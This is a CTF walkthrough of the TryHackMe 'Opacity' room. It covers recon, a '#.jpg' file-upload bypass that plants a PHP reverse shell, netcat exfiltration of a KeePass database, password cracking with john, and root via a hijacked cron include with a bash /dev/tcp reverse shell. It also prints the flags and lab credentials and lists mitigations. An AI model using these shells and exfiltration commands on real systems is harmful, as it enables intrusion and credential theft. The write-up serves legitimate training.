# CTF Write-Up: [Opacity](https://tryhackme.com/room/opacity)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## 🚩 Flags

<details>
<summary>User Flag</summary>

`6661b61b44d234d230d06bf5b3c075e2`

</details>

<details>
<summary>Root Flag</summary>

`ac0d56f93202dd57dcb2498c739fd20e`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```bash
nmap -vv -oN Nmap/Initial <IP_ADDRESS> -Pn
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

### Detailed Nmap Scan

```bash
nmap -vv -oN Nmap/Detailed -p 22,80,139,445 -A -Pn <IP_ADDRESS>
```

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80 | HTTP | Apache httpd 2.4.41 (Ubuntu) |
| 139 | NetBIOS | Samba smbd 4 |
| 445 | SMB | Samba smbd 4 |

The HTTP server redirects immediately to `/login.php`. Wappalyzer confirmed a standard LAMP stack — Apache 2.4.41, PHP, Ubuntu.

### Web Enumeration (Gobuster)

```bash
gobuster dir -u http://<IP_ADDRESS>/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

```
/css      (Status: 301)
/cloud    (Status: 301)  ← file upload page
```

The `/cloud/` page presented a **"5 Minutes File Upload"** form accepting an external URL to fetch and store as an image. Uploaded files are automatically deleted every 5 minutes via a cron job.

---

## 2. Initial Access — Remote File Upload + .php#.jpg Bypass

The `/cloud/` upload form fetches a file from a supplied URL. Direct `.php` uploads were blocked, but appending `#.jpg` to the URL tricks the server-side filter into accepting the request while the file is still saved with a `.php` extension on the server.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
# Edit: $ip = 'tun0'; $port = 4444;

python3 -m http.server 8888
```

Submitted to the upload form:
```
http://<TUN0_IP>:8888/shell.php#.jpg
```

```bash
# Start listener
nc -lvnp 4444

# Trigger the shell
curl http://<IP_ADDRESS>/cloud/images/shell.php
```

Shell stabilised with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

✅ Shell as `www-data`.

---

## 3. Lateral Movement — www-data → sysadmin

A KeePass database was found at `/opt/dataset.kdbx`. It was exfiltrated using netcat:

```bash
# On attack machine
nc -lvnp 9999 > dataset.kdbx

# On target
cat /opt/dataset.kdbx | nc tun0 9999
```

The master password was cracked with john:

```bash
keepass2john dataset.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
741852963    (dataset)
```

Opening the database revealed SSH credentials for `sysadmin`:

```
sysadmin:Cl0udP4ss40p4city#8700
```

```bash
ssh sysadmin@<IP_ADDRESS>
# Password: Cl0udP4ss40p4city#8700
```

---

## 4. User Flag

```bash
cat /home/sysadmin/local.txt
```

> User flag: `6661b61b44d234d230d06bf5b3c075e2`

---

## 5. Privilege Escalation — Cron Job + Writable lib Directory

Enumerating the home directory revealed a `scripts/` folder containing a PHP script run by a root cron job:

```bash
cat ~/scripts/script.php
```

```php
<?php
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
```

The `lib/` directory was owned by `sysadmin`, meaning files inside could be deleted and recreated despite being owned by root. Replacing `backup.inc.php` with a reverse shell payload would execute as root when the cron fired:

```bash
rm ~/scripts/lib/backup.inc.php
echo '<?php exec("/bin/bash -c '"'"'bash -i >& /dev/tcp/tun0/5555 0>&1'"'"'"); ?>' > ~/scripts/lib/backup.inc.php
```

```bash
# Listener on attack machine
nc -lvnp 5555
```

Within a minute the cron job executed `script.php` as root, which included the malicious `backup.inc.php` and returned a root shell.

---

## 6. Root Flag

```bash
cat /root/proof.txt
```

> Root flag: `ac0d56f93202dd57dcb2498c739fd20e`

---

## 7. Attack Chain

```
Nmap Scan
    └─► Port 22 (SSH), Port 80 (HTTP/Apache), Port 139/445 (SMB)

Gobuster on /
    └─► /cloud → external URL file upload form

File Upload Filter Bypass
    └─► shell.php#.jpg → saved as shell.php → RCE as www-data

/opt/dataset.kdbx
    └─► Exfiltrated via netcat → cracked with john (741852963)
    └─► KeePass entry → sysadmin:Cl0udP4ss40p4city#8700

SSH Login (sysadmin)
    └─► local.txt → user flag

Cron Job Enumeration
    └─► script.php runs as root → require_once lib/backup.inc.php
    └─► lib/ directory writable by sysadmin

Malicious backup.inc.php
    └─► Replaced via rm + echo → cron triggers → root shell → proof.txt
```

---

## 8. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | File upload extension filter bypassable via `#.jpg` | RCE as www-data | Validate file magic bytes server-side, not just the URL extension |
| 2 | KeePass database stored in world-readable `/opt/` | Credential theft | Restrict sensitive file permissions; store outside web/system paths |
| 3 | Weak KeePass master password | Database cracked via rockyou | Use a strong, unique master password not in common wordlists |
| 4 | Cron job includes file from user-writable directory | Full root compromise | Never include files from directories writable by unprivileged users |

---

*Opacity — TryHackMe | Rooted ✅*
